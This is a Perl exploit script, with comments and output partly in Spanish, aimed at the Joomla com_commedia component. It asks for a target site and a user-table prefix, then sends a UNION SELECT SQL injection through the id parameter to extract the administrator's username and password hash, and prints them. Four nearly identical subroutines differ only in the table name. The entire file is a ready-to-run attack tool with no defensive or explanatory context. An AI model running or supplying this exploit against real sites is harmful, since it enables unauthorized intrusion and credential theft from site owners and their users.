#!/usr/bin/perl -w
    ########################################
    # Joomla Component (commedia) Remote SQL Exploit
    #----------------------------------------------------------------------------#
    ########################################
    print "\t\t\n\n";
print "\t\n";
print "\t            Daniel Barragan  D4NB4R                \n";
print "\t                                                   \n";
print "\t      Joomla com_commedia Remote Sql Exploit \n";
print "\t\n\n";
print "                   :::Opciones de prefijo tabla users:::\n\n";
print "    1.  jos_users  2.  jml_users  3.  muc_users  4.  sgj_users  \n\n\n";

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

print ":::Opcion::: ";
my $option=<STDIN>;
if ($option==1){&jos_users}
if ($option==2){&jml_users}
if ($option==3){&muc_users}
if ($option==4){&sgj_users}


sub jos_users {


print "\nIngrese el Sitio:[http://wwww.site.com/path/]: ";


chomp(my $target=<STDIN>);

    #the username of  joomla
    $user="username";
    #the pasword of  joomla
    $pass="password";
    #the tables of joomla
    $table="jos_users";
    $d4n="com_commedia&format";
    $parametro="down&pid=59&id";
    
    $b = LWP::UserAgent->new() or die "Could not initialize browser\n";
    $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
       $host = $target ."index.php?option=".$d4n."=raw&task=".$parametro."=999999.9 union all select (select concat(0x3c757365723e,".$user.",0x3c757365723e3c706173733e,count(*),".$pass.",0x3c706173733e) from ".$table."),null--";
    $res = $b->request(HTTP::Request->new(GET=>$host));
    $answer = $res->content;
    
    if ($answer =~ /<user>(.*?)<user>/){
            print "\nLos Datos Extraidos son:\n";
      print "\n
     
* Admin User : $1";
     
    }
    
    if ($answer =~/<pass>(.*?)<pass>/){print "\n
     
* Admin Hash : $1\n\n";
     
    print "\t\t#   El Exploit aporto usuario y password   #\n\n";}
    else{print "\n[-] Exploit Failed, Intente manualmente...\n";}
}

sub jml_users {


print "\nIngrese el Sitio:[http://wwww.site.com/path/]: ";


chomp(my $target=<STDIN>);

    #the username of  joomla
    $user="username";
    #the pasword of  joomla
    $pass="password";
    #the tables of joomla
    $table="jml_users";
    $d4n="com_commedia&format";
    $parametro="down&pid=59&id";
    
    $b = LWP::UserAgent->new() or die "Could not initialize browser\n";
    $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
       $host = $target ."index.php?option=".$d4n."=raw&task=".$parametro."=999999.9 union all select (select concat(0x3c757365723e,".$user.",0x3c757365723e3c706173733e,count(*),".$pass.",0x3c706173733e) from ".$table."),null--";
    $res = $b->request(HTTP::Request->new(GET=>$host));
    $answer = $res->content;
    
    if ($answer =~ /<user>(.*?)<user>/){
            print "\nLos Datos Extraidos son:\n";
      print "\n
     
* Admin User : $1";
     
    }
    
    if ($answer =~/<pass>(.*?)<pass>/){print "\n
     
* Admin Hash : $1\n\n";
     
    print "\t\t#   El Exploit aporto usuario y password   #\n\n";}
    else{print "\n[-] Exploit Failed, Intente manualmente...\n";}
}

sub muc_users {


print "\nIngrese el Sitio:[http://wwww.site.com/path/]: ";


chomp(my $target=<STDIN>);

    #the username of  joomla
    $user="username";
    #the pasword of  joomla
    $pass="password";
    #the tables of joomla
    $table="muc_users";
    $d4n="com_commedia&format";
    $parametro="down&pid=59&id";
    
    $b = LWP::UserAgent->new() or die "Could not initialize browser\n";
    $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
       $host = $target ."index.php?option=".$d4n."=raw&task=".$parametro."=999999.9 union all select (select concat(0x3c757365723e,".$user.",0x3c757365723e3c706173733e,count(*),".$pass.",0x3c706173733e) from ".$table."),null--";
    $res = $b->request(HTTP::Request->new(GET=>$host));
    $answer = $res->content;
    
    if ($answer =~ /<user>(.*?)<user>/){
            print "\nLos Datos Extraidos son:\n";
      print "\n
     
* Admin User : $1";
     
    }
    
    if ($answer =~/<pass>(.*?)<pass>/){print "\n
     
* Admin Hash : $1\n\n";
     
    print "\t\t#   El Exploit aporto usuario y password   #\n\n";}
    else{print "\n[-] Exploit Failed, Intente manualmente...\n";}
}

sub sgj_users {


print "\nIngrese el Sitio:[http://wwww.site.com/path/]: ";


chomp(my $target=<STDIN>);

    #the username of  joomla
    $user="username";
    #the pasword of  joomla
    $pass="password";
    #the tables of joomla
    $table="sgj_users";
    $d4n="com_commedia&format";
    $parametro="down&pid=59&id";
    
    $b = LWP::UserAgent->new() or die "Could not initialize browser\n";
    $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
       $host = $target ."index.php?option=".$d4n."=raw&task=".$parametro."=999999.9 union all select (select concat(0x3c757365723e,".$user.",0x3c757365723e3c706173733e,count(*),".$pass.",0x3c706173733e) from ".$table."),null--";
    $res = $b->request(HTTP::Request->new(GET=>$host));
    $answer = $res->content;
    
    if ($answer =~ /<user>(.*?)<user>/){
            print "\nLos Datos Extraidos son:\n";
      print "\n
     
* Admin User : $1";
     
    }
    
    if ($answer =~/<pass>(.*?)<pass>/){print "\n
     
* Admin Hash : $1\n\n";
     
    print "\t\t#   El Exploit aporto usuario y password   #\n\n";}
    else{print "\n[-] Exploit Failed, Intente manualmente...\n";}
}
